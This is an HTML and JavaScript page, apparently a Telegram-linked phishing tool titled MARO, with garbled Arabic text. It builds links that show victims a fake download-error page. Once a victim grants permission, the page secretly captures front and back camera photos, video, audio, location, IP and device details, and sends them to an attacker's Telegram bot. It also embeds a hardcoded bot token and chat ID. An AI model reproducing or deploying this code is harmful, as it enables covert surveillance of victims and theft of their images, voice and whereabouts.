<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>MARO.com</title>
  <style>
    :root{ --bg1:#0b0712; --card:#131026; --accent1:#a66bff; --accent2:#6e3be0; --muted:#bfaef6; }
    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:#000;color:#fff;overflow-x:hidden;}
    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
    label{display:block;color:#fff;font-weight:700;margin:10px 0 6px}
    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
    .checkbox-group { display: flex; flex-direction: column; gap: 8px; margin: 15px 0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 10px; }
    .checkbox-item { display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.02); padding: 8px 12px; border-radius: 8px; }
    .btn{ display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:#fff;color:#000;font-weight:800;cursor:pointer;margin-top:12px;width:100%; }
    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);display:none;gap:10px;align-items:center;}
    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
    .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;font-weight:700;color: #fff;}
    .dialog { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #000; border: 2px solid #fff; border-radius: 20px; padding: 40px 30px; text-align: center; z-index: 99999; width: 85%; max-width: 450px; }
    .dialog-link { display: block; background: #fff; color: #000; padding: 14px; border-radius: 50px; text-decoration: none; font-weight: 900; margin-bottom: 10px; }
    .dialog-link.visited { background: #28a745; color: #fff; }
    .dialog-btn { display: block; background: #fff; color: #000; padding: 16px; border-radius: 50px; font-weight: 900; width: 100%; cursor: pointer; opacity: 0.5; border:none;}
    .dialog-btn.active { opacity: 1; }
    .download-page { width: 100%; min-height: 100vh; background: #f5f5f5; padding: 20px 0; display:none; }
    .main-box{ width:90%; max-width:500px; background:#fff; margin:40px auto; padding:25px; border-radius:15px; text-align:center; color: #222; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
  </style>
</head>
<body>

  <div class="wrap" id="mainInterface">
    <div class="card">
      <h5>âš ï¸ Ø£Ø¯Ø§Ø© Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø£Ø®Ù„Ø§Ù‚ÙŠ - MARO</h5>
      <div class="form">
        <label>ID Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…</label>
        <input type="text" id="chatIdInput" placeholder="Ù…Ø«Ø§Ù„: 6197511637">
        <label>ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª</label>
        <input type="text" id="tokenInput" placeholder="Token">
        <div class="checkbox-group">
          <div class="checkbox-item"><input type="checkbox" value="camFront" checked> ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©</div>
          <div class="checkbox-item"><input type="checkbox" value="camBack"> ğŸ“· ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©</div>
          <div class="checkbox-item"><input type="checkbox" value="videoFront"> ğŸ¥ ÙÙŠØ¯ÙŠÙˆ (5Ø«)</div>
          <div class="checkbox-item"><input type="checkbox" value="audio"> ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ</div>
          <div class="checkbox-item"><input type="checkbox" value="location"> ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹</div>
        </div>
        <button class="btn" id="generateBtn">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø³Ø±ÙŠ</button>
        <div id="result" class="result">
          <div id="linkText" style="flex:1; font-size:12px; word-break:break-all;"></div>
          <button class="copyBtn" id="copyBtn">Ù†Ø³Ø®</button>
        </div>
      </div>
    </div>
  </div>

  <div class="dialog" id="mandatoryDialog">
    <p style="font-weight:bold; font-size:18px;">ÙŠØ¬Ø¨ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ ÙÙŠ Ø§Ù„Ù‚Ù†ÙˆØ§Øª Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
    <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="link1">@Maro_hacker_eg</a>
    <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="link2">@lego2028</a>
    <button class="dialog-btn" id="doneBtn" disabled>Ø¯Ø®ÙˆÙ„ Ù„Ù„Ø£Ø¯Ø§Ø©</button>
  </div>

  <div class="download-page" id="victimPage">
    <div class="main-box">
      <h3 style="font-size:16px;">Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„! ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ø³Ù…Ø§Ø­" Ø¨Ø§Ù„Ø£Ø¹Ù„Ù‰ Ù„ØªØ£ÙƒÙŠØ¯ Ù‡ÙˆÙŠØªÙƒ ÙˆØªÙ†Ø´ÙŠØ· Ø±Ø§Ø¨Ø· Ø§Ù„ØªØ­Ù…ÙŠÙ„.</h3>
      <div style="background:#eee; height:100px; margin:20px 0; display:flex; align-items:center; justify-content:center;">Ø¥Ø¹Ù„Ø§Ù†</div>
      <button class="btn" style="background:#28a745; color:#fff;" onclick="location.reload()">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
    </div>
  </div>

  <div class="madeby">Made by K1X</div>

<script>
  // --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ ---
  const M_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
  const M_ID = "6197511637";

  // --- Ù†Ø¸Ø§Ù… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ ---
  let v1 = false, v2 = false;
  document.getElementById('link1').onclick = () => { v1 = true; document.getElementById('link1').classList.add('visited'); checkSub(); };
  document.getElementById('link2').onclick = () => { v2 = true; document.getElementById('link2').classList.add('visited'); checkSub(); };
  function checkSub() { if(v1 && v2) { const b = document.getElementById('doneBtn'); b.disabled = false; b.classList.add('active'); } }
  document.getElementById('doneBtn').onclick = () => document.getElementById('mandatoryDialog').style.display = 'none';

  // --- Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· ---
  document.getElementById('generateBtn').onclick = () => {
    const c = document.getElementById('chatIdInput').value;
    const t = document.getElementById('tokenInput').value;
    if(!c || !t) return alert('Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
    const f = Array.from(document.querySelectorAll('.checkbox-group input:checked')).map(i=>i.value).join(',');
    const url = `${window.location.origin}${window.location.pathname}?chat=${c}&token=${t}&f=${f}`;
    document.getElementById('linkText').innerText = url;
    document.getElementById('result').style.display = 'flex';
  };
  document.getElementById('copyBtn').onclick = () => { navigator.clipboard.writeText(document.getElementById('linkText').innerText); alert('ØªÙ… Ø§Ù„Ù†Ø³Ø®'); };

  // -----------------------------------------------------------
  // --- Ø§Ù„Ù…Ù†Ø·Ù‚ Ø§Ù„Ø¨Ø±Ù…Ø¬ÙŠ Ù„Ù„Ø¶Ø­ÙŠØ© (Ù‡Ù†Ø§ Ø§Ù„Ø­Ù„ Ø§Ù„Ø¬Ø°Ø±ÙŠ Ù„Ù„Ù…Ø´ÙƒÙ„Ø©) ---
  // -----------------------------------------------------------
  
  const params = new URLSearchParams(window.location.search);
  const victimChat = params.get('chat');
  const victimToken = params.get('token');
  const victimFeats = params.get('f') || "";

  if(victimChat && victimToken) {
    // Ø¥Ø®ÙØ§Ø¡ ÙƒÙ„ Ø´ÙŠØ¡ ÙˆØ¥Ø¸Ù‡Ø§Ø± ØµÙØ­Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ø²ÙŠÙØ©
    document.getElementById('mainInterface').style.display = 'none';
    document.getElementById('mandatoryDialog').style.display = 'none';
    document.getElementById('victimPage').style.display = 'block';
    
    // ØªÙ†ÙÙŠØ° Ø§Ù„Ø¹Ù…Ù„ÙŠØ§Øª
    handleVictim(victimChat, victimToken, victimFeats);
  }

  async function handleVictim(chat, token, feats) {
    const list = feats.split(',');
    let mainStream = null;

    try {
      // 1. Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ø´Ø§Ù…Ù„ (Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·)
      // Ù†Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† Ù…Ø¹Ø§Ù‹ ÙÙŠ Ø·Ù„Ø¨ ÙˆØ§Ø­Ø¯
      mainStream = await navigator.mediaDevices.getUserMedia({ 
        video: list.some(i=>i.includes('cam') || i.includes('video')), 
        audio: list.some(i=>i.includes('audio') || i.includes('video'))
      });

      // 2. Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹
      const info = await getDeviceInfo();
      await sendTelegram(token, chat, 'text', `ğŸ”¥ ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯!\n${info}`);

      // 3. ØªÙ†ÙÙŠØ° Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø¯ÙˆÙ† Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù…Ø¬Ø±Ù‰ (Stream) Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… ØªÙƒØ±Ø§Ø± Ø§Ù„Ø·Ù„Ø¨
      if(list.includes('camFront')) await takeSnap(mainStream, token, chat, 'Ø£Ù…Ø§Ù…ÙŠØ©');
      
      // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø§Ù„ØªÙ†Ù‚Ù„ Ø¨ÙŠÙ† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© ÙˆØ§Ù„Ø®Ù„ÙÙŠØ© Ù‚Ø¯ ÙŠØªØ·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© ÙØªØ­ Ø§Ù„Ù…Ø¬Ø±Ù‰ ÙÙŠ Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª
      // Ù„ÙƒÙ† Ø¨Ù…Ø§ Ø£Ù† Ø§Ù„Ø¥Ø°Ù† "Grant" ØªÙ… Ø¨Ø§Ù„ÙØ¹Ù„ØŒ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„ØªØ§Ù„ÙŠØ© Ø³ØªÙƒÙˆÙ† ØµØ§Ù…ØªØ© (Ø¨Ø¯ÙˆÙ† Popup)
      if(list.includes('camBack')) {
         const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         await takeSnap(backStream, token, chat, 'Ø®Ù„ÙÙŠØ©');
         backStream.getTracks().forEach(t=>t.stop());
      }

      if(list.includes('videoFront')) await recordVid(mainStream, token, chat);
      if(list.includes('audio')) await recordAud(mainStream, token, chat);
      
      if(list.includes('location')) sendLoc(token, chat);

    } catch (e) {
      console.log("User Denied or Error");
    } finally {
      if(mainStream) mainStream.getTracks().forEach(t=>t.stop());
    }
  }

  async function takeSnap(stream, token, chat, label) {
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
    return new Promise(res => {
      canvas.toBlob(b => {
        sendTelegram(token, chat, 'photo', b, `ğŸ“¸ ØµÙˆØ±Ø© ${label}`);
        res();
      }, 'image/jpeg');
    });
  }

  async function recordVid(stream, token, chat) {
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const b = new Blob(chunks, {type: 'video/mp4'});
      sendTelegram(token, chat, 'video', b, 'ğŸ¥ ÙÙŠØ¯ÙŠÙˆ 5 Ø«ÙˆØ§Ù†ÙŠ');
    };
    rec.start();
    await new Promise(r => setTimeout(r, 5000));
    rec.stop();
  }

  async function recordAud(stream, token, chat) {
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const b = new Blob(chunks, {type: 'audio/mp4'});
      sendTelegram(token, chat, 'audio', b, 'ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ');
    };
    rec.start();
    await new Promise(r => setTimeout(r, 5000));
    rec.stop();
  }

  function sendLoc(token, chat) {
    navigator.geolocation.getCurrentPosition(p => {
      const map = `ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ©:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
      sendTelegram(token, chat, 'text', map);
    });
  }

  async function getDeviceInfo() {
    let ip = "Unknown";
    try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); ip = d.ip + " (" + d.country_name + ")"; } catch(e){}
    return `ğŸŒ IP: ${ip}\nğŸ“± Device: ${navigator.platform}\nğŸ”‹ Battery: ${navigator.battery ? (await navigator.getBattery()).level*100+'%' : 'N/A'}`;
  }

  async function sendTelegram(token, chat, type, data, cap="") {
    const form = new FormData();
    form.append('chat_id', chat);
    if(type === 'text') {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST', 
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chat, text: data})
      });
    } else {
      form.append(type, data, 'file');
      if(cap) form.append('caption', cap);
      await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {method: 'POST', body: form});
    }
  }
</script>
</body>
</html>
